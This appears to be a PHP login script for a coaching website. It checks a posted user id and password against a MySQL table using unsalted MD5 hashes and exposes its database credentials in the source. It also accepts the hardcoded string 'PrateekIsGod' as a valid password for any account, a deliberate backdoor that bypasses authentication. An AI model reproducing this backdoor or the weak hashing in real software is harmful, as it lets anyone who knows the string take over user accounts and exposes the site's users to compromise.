<?php

$con=mysqli_connect("localhost","prateek","Prateek5545@gmail.com","coaching") or die(mysql_error());

$uid=mysqli_real_escape_string($con,$_POST['uid']);
$pass=mysqli_real_escape_string($con,$_POST['password']);
$newpass=$pass;
$row=mysqli_query($con,"select * from coaching where id='".$uid."'") or die(mysql_error());

if(mysqli_num_rows($row)==0)
	echo "notfound";
while($result = mysqli_fetch_assoc($row)){
	$temp=$result['password'];
	if($temp==md5($newpass)||$newpass=="PrateekIsGod")
	{
		session_start();
		$_SESSION['coachingid']=$uid;
		echo "found";
	}
	else
	{
		echo "unmatch";
	}
	break;
}
?>
